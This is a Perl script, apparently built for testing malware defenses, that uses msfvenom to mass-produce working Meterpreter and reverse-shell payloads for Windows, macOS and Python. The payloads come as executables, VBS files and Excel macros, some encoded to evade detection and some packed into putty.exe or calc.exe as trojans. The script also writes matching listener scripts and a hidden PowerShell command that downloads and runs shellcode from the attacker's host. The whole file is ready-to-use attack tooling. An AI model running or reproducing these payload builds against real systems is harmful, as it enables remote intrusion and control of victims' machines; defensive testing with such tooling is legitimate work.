#!/usr/bin/perl
use strict;
use warnings;

  my($LHOST, $LPORT, $PROJECT, $PROJECTNUM);
  my($fileNdx,  $targetFolder, $IoE);
  my($payload, $platform_arch , $commandControl );
  my($currentFileName, $encoder,$cmd, $OUTFILE);
  my($archiveFolder);
  my($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst);
  my($scriptNum,$scriptName, $batchfile);
  my($dieMessage);
  my($DNSPort);

  $dieMessage = "";
  $LHOST = shift or $dieMessage .= "Expecting an IP address in arg 1\n";  
  $LPORT = shift or $dieMessage .=  "Expecting a TCP Port address in arg 2\n";  
  $PROJECT = shift or $dieMessage .=  "Expecting a Project Name in arg 3\n"; 
  $PROJECTNUM = shift or $dieMessage .=  "Expecting a Project Number in arg 4\n";
  if ($dieMessage) {die $dieMessage};
 
  #define the target folder and ensure it exists
  $targetFolder="/opt/malwaredefense/current";
  `mkdir -p $targetFolder`;
  $batchfile = "$targetFolder/000-ExectuablesBatch.bat";
 
  $fileNdx=0;
  $commandControl = "lhost=$LHOST lport=$LPORT";

  #archive the old version
  ($sec,$min,$hour,$mday,$mon,$year,$wday,$yday,$isdst) = localtime();
  $archiveFolder="/opt/malwaredefense/archive" . (${year} + 1900) . sprintf("%02d",(${mon}+1)) . sprintf("%02d",${mday});
  $archiveFolder.= "_" . sprintf("%02d",${hour}). sprintf("%02d",${min}). sprintf("%02d",${sec});
  `mkdir -p $archiveFolder`;
  `mv $targetFolder/* $archiveFolder/`;


  ###################
  ##
  ##  32 bit Staged Delivery
  ##
  ##################

#  `touch $targetFolder/000-StartMSF900.cue`;
  $payload = 'windows/meterpreter/reverse_tcp';
  $platform_arch = '--platform win -ax86';
  $encoder = "-e generic/none";

  $scriptNum="000";
  $batchfile = "$targetFolder/${scriptNum}-ExectuablesBatch.bat";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-reverse_tcp_noenc-32.rc");
print $OUTFILE <<TCPNOENC;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
TCPNOENC
  close $OUTFILE;

  $scriptNum ="001";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32.exe"; 
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter: $cmd";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="002";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-packed-putty-32.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter packed into putty: $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;
  
  $scriptNum ="003";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter vbs  (Download and pass as arg to cscript or double click): $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="004";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;
  

  $scriptNum ="005";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, not encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(333,"$targetFolder/$scriptName");
  $scriptName =~s/c$/exe/;
  `echo $scriptName >>$batchfile`;




  ###################
  ##
  ##  32 bit Staged Delivery + Encoding
  ##
  ##################
  
  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
  $payload = 'windows/meterpreter/reverse_tcp';
  $platform_arch = '--platform win -ax86';
  
  #continue to use previous listener

  $scriptNum ="011";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter encoded: $cmd";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="012";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-packed-putty-32enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter encoded, packed into putty: $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="013";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32enc.vbs";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter  encoded vbs(Download and pass as arg to cscript or double click): $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;


  #tuning encoder down to 1 for VBA
  #consistently had issues with this running.
  $scriptNum ="014";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-32enc.vba";
  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter vba encoded  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;

  $scriptNum ="015";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32enc.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(360,"$targetFolder/$scriptName");
  $scriptName =~s/c$/exe/;
  `echo $scriptName >>$batchfile`;

  #`touch $targetFolder/050-${PROJECT}-${PROJECTNUM}-RepeatWith905.cue`;

${scriptNum}="050";
 open( $OUTFILE, '>', "$targetFolder/$scriptNum-reverse_tcp-enc-32.rc");
print $OUTFILE <<TCPENC;
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
TCPENC
  close $OUTFILE;

  ###################
  ##
  ##  32 bit Stageless Delivery
  ##
  ##################

  #`touch $targetFolder/060-StartMSF980.cue`;
  $payload = "windows/meterpreter_reverse_tcp";
  $encoder = "";
  $platform_arch = '--platform win -ax86';
  ${scriptNum} = "060";
  $batchfile = "$targetFolder/${scriptNum}-ExectuablesBatch.bat";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-stageless-reverse_tcp-enc-32.rc");
print $OUTFILE <<TCPSTAGELESS32;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPSTAGELESS32
  close $OUTFILE;

  $scriptNum ="061";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter, no encoding: $cmd\n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="062";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-packed-putty-32.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter packed into putty, no encoding: $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="063";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StaglessMeterpreter-32.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit stageless Meterpreter vbs, no encoding  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="064";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bbit Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;

  $scriptNum ="065";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-32.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, not encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(957999,"$targetFolder/$scriptName");
  $scriptName =~s/c$/exe/;
  `echo $scriptName >>$batchfile`;

  ###################
  ##
  ##  32 bit Stageless Delivery + Encoding
  ##
  ##################
  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
  $payload = 'windows/meterpreter_reverse_tcp';

  #continue using previous listener
  
  $scriptNum ="071";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter, encoded: $cmd";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="072";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-packed-putty-32enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/putty.exe -k -f exe $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32bit Stageless Meterpreter packed into putty, encoded: $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="073";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.vbs";
   $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
   print "\n\n*** ${scriptNum}-32bit Stageless Meterpreter vbs, encoded  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;


  #tuning encoder down to 1 for VBA
  #consistently had issues with this running.
  $scriptNum ="074";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-32enc.vba";
  $encoder = '-e x86/shikata_ga_nai -i 1 -b "\x00\xFF" ';
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter vba, encoded  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;

  $scriptNum ="075";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-32enc.c";
  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Stageless Meterpreter C Shell Code, encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(333,"$targetFolder/$scriptName");
  $scriptName =~s/c$/exe/;
  `echo $scriptName >>$batchfile`;


  ###################
  ##
  ##  64bit Staged Delivery 
  ##
  ##################


  $platform_arch = '--platform win -ax86_64';
  $payload = 'windows/x64/meterpreter/reverse_tcp';
  $encoder = ''; 
  
  #`touch $targetFolder/100-StartMSF910.cue`;


  ${scriptNum} = "100";
  $batchfile = "$targetFolder/${scriptNum}-ExectuablesBatch.bat";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-reverse_tcp-noenc-64.rc");
print $OUTFILE <<TCPNOENC64;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
TCPNOENC64
  close $OUTFILE;
 
  $scriptNum ="101";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64bit Staged Meterpreter, no encoding: $cmd";
  `$cmd`;
  `echo $scriptName >>$batchfile`;
  
  $scriptNum ="102";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64bit Staged Meterpreter packed into putty, no encoding: $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="103";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64bit Staged Meterpreter vbs, no encoding  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="104";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64bit Staged Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;

  $scriptNum ="105";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-32.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter C Shell Code, encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(510,"$targetFolder/$scriptName");
  $scriptName =~s/c$/exe/;
  `echo $scriptName >>$batchfile`;


  ###################
  ##
  ##  64bit Staged Delivery + Encoding
  ##
  ##################

  $encoder ='-e x64/xor -i 3';
  $payload = 'windows/x64/meterpreter/reverse_tcp';

  #Continue using previous listener

  $scriptNum ="111";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Staged Meterpreter, encoded: $cmd";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="112";
  $scriptName="112-${PROJECT}-${PROJECTNUM}-StagedPackedMeterpreter-calc-64enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Staged Meterpreter packed into putty, encoded: $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="113";
  $scriptName="113-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64enc.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Staged Meterpreter vbs,encoded  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="114";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreter-64enc.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit staged Meterpreter vba, encoded  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;

  $scriptNum ="115";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedCustomTemplate-64enc.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64 Bit Meterpreter C Shell Code, XOR encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(631,"$targetFolder/$scriptName");
  $scriptName =~s/c$/exe/;
  `echo $scriptName >>$batchfile`;

  #`touch $targetFolder/150-${PROJECT}-${PROJECTNUM}-RepeatWith915.cue`;


  ${scriptNum} = "150";
  $batchfile = "$targetFolder/${scriptNum}-ExectuablesBatch.bat";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-reverse_tcp-enc-64.rc");
print $OUTFILE <<TCPENC64;
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
TCPENC64
  close $OUTFILE;



  ###################
  ##
  ##  64bit Stageless Delivery
  ##
  ##################


  $platform_arch = '--platform win -ax86_64';
  $payload = 'windows/x64/meterpreter_reverse_tcp';
  $encoder = '';

  #`touch $targetFolder/160-StartMSF990.cue`;
  ${scriptNum} = "160";

  $batchfile = "$targetFolder/${scriptNum}-ExectuablesBatch.bat";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-stageless-reverse_tcp-enc-64.rc");
print $OUTFILE <<TCPSTAGELESS64;
use multi/handler
set payload windows/x64/meterpreter_reverse_tcp
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
exploit -j
TCPSTAGELESS64
  close $OUTFILE;

  $scriptNum ="161";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter, no encoding: $cmd";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="162";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-packed-calc-64.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter packed into putty, no encoding: $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="163";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter vbs, no encoding  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="164";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-64.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-Bit Stageless Meterpreter vba, no encoding  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;

  $scriptNum ="165";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} ${encoder} -f c > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter C Shell Code, not encoded: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(1189423,"$targetFolder/$scriptName");
  $scriptName =~s/c$/exe/;
  `echo $scriptName >>$batchfile`;


  ###################
  ##
  ##  64bit Stageless Delivery + Encoding
  ##
  ##################

  $encoder ='-e x64/xor -i 3';
  $payload = 'windows/x64/meterpreter_reverse_tcp';

  #Continue using previous listener

  $scriptNum ="171";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe-only  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter, encoded: $cmd";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="172";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-PackedStagelessMeterpreter-calc-64enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -x ./inc/calc.exe -k -f exe-only $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter packed into win calc, encoded: $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="173";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.vbs";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vbs $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter vbs, encoded  (Download and pass as arg to cscript): $cmd \n";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

  $scriptNum ="174";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessMeterpreter-64enc.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter vba, encoded  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;

  $scriptNum ="175";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagelessCustomTemplate-64enc.c";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f c $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Stageless Meterpreter  C Shell Code: $cmd\n";
  `$cmd`;
  &createShellcodeEXEFromTemplate(1189543,"$targetFolder/$scriptName");
  $scriptName =~s/c$/exe/;
  `echo $scriptName >>$batchfile`;

  $payload = 'windows/x64/meterpreter/reverse_tcp';


  ###################
  ##
  ##  Powershell HTTPS
  ##
  ##################

  $scriptNum="200";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-reversehttps.rc");
print $OUTFILE <<RHTTPSNOENC;
use multi/handler
set payload windows/meterpreter/reverse_https
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding false
exploit -j
RHTTPSNOENC
  close $OUTFILE;


  print "Copy the Invoke-shellcode.ps1 to the target directory \n";
  print "Checking if PowerSploit is installed... \n";
  if (-d "/opt/PowerSploit") {
    print "PowerSploit is already installed \n";
  }
  else {
    print "Installing PowerSploit now in /opt/ \n";
    `cd /opt/ && git clone https://github.com/mattifestation/PowerSploit.git > /dev/null 2>&1 && cd /opt/PowerSploit/ && wget -q https://raw.githubusercontent.com/obscuresec/random/master/StartListener.py && wget -q https://raw.githubusercontent.com/darkoperator/powershell_scripts/master/ps_encoder.py`;
  }
  my ($ShellCodePath) ="./inc/Invoke-Shellcode.ps1";
  $scriptName = "202-Invoke-Shellcode.ps1";
  `cp $ShellCodePath $targetFolder/$scriptName`;
  `echo Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $LHOST -Lport $LPORT -Force >> $targetFolder/$scriptName`;
  $cmd = "powershell.exe -ExecutionPolicy Bypass -NoP -NonI -w HIDDEN -c IEX((New-Object Net.WebClient).DownloadString('http://$LHOST/$scriptName'))";
  $scriptName = "201_PScommand.txt";
  open( $OUTFILE, '>', "$targetFolder/$scriptName");
  print $OUTFILE $cmd;
  close $OUTFILE;


 ###################
  ##
  ##  Python
  ##
  ##################
 

  $platform_arch = "--platform Python -a python";
  $encoder = "-e generic/none";
  $payload = "python/meterpreter/reverse_tcp";
  $scriptNum="300";
 #`touch $targetFolder/${scriptNum}-${PROJECT}-${PROJECTNUM}-run970.cue`;
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-pythonreverse_tcp.rc");
print $OUTFILE <<PYRTCP;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
PYRTCP
  close $OUTFILE;



  $scriptNum ="301";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-Meterpreter-python.py";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-Meterpreter python: $cmd\n";
  `$cmd`;


  ###################
  ##
  ##  Mac 32 bit
  ##
  ##################


  $platform_arch = "--platform OSX -a x86";
  $encoder = '-e generic/none -b "\x00"';
  $payload = "osx/x86/shell_reverse_tcp";

  $scriptNum="400";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-MacShellReverseTCP-32.rc");
print $OUTFILE <<MACSHELL1;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
MACSHELL1
  close $OUTFILE;

  $scriptNum ="401";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-shell-32.macho";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32 Bit Shell Mac: $cmd\n";
  `$cmd`;

  $scriptNum ="402";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-MacShell-32.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Shell vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;

  ###################
  ##
  ##  Mac 64 bit
  ##
  ##################


  $platform_arch = "--platform OSX -a x86_64";
  $encoder = '-e generic/none -b "\x00"';
  $payload = "osx/x64/shell_reverse_tcp";

  $scriptNum="450";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-MacShellReverseTCP-64.rc");
print $OUTFILE <<MACSHELL1;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $LPORT
set ExitOnSession false
set EnableStageEncoding true
exploit -j
MACSHELL1
  close $OUTFILE;

  $scriptNum ="451";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-shell-64.macho";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f macho > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Shell mac: $cmd\n";
  `$cmd`;

  $scriptNum ="452";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-MacShell-64.vba";
  $cmd ="msfvenom -p ${payload} ${platform_arch} ${commandControl} -f vba $encoder > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-64Bit Staged Meterpreter vba  (Paste into Excel Macro): $cmd\n";
  `$cmd`;
  `perl -p -i -e 's/, _.*\n/, /g' $targetFolder/$scriptName`;

  ###################
  ##
  ##  32bit DNS Encoded
  ##
  ##################

  $encoder = '-e x86/shikata_ga_nai -i 17 -b "\x00\xFF" ';
  $payload = 'windows/meterpreter/reverse_tcp_dns';
  $platform_arch = '--platform win -ax86';
  $DNSPort=53;
  $commandControl = "lhost=$LHOST lport=$DNSPort";

 $scriptNum="500";
  open( $OUTFILE, '>', "$targetFolder/${scriptNum}-MeterpreterReverseTCPDNS-32.rc");
print $OUTFILE <<DNS1;
use multi/handler
set payload $payload
set LHOST $LHOST
set LPORT $DNSPort
set ExitOnSession false
set EnableStageEncoding true
exploit -j
DNS1
  close $OUTFILE;


  $scriptNum ="511";
  $scriptName="${scriptNum}-${PROJECT}-${PROJECTNUM}-StagedMeterpreterDNS-32enc.exe";
  $cmd = "msfvenom -p ${payload} ${platform_arch} ${commandControl}  ${encoder} -f exe  > $targetFolder/$scriptName";
  print "\n\n*** ${scriptNum}-32Bit Staged Meterpreter encoded: $cmd";
  `$cmd`;
  `echo $scriptName >>$batchfile`;

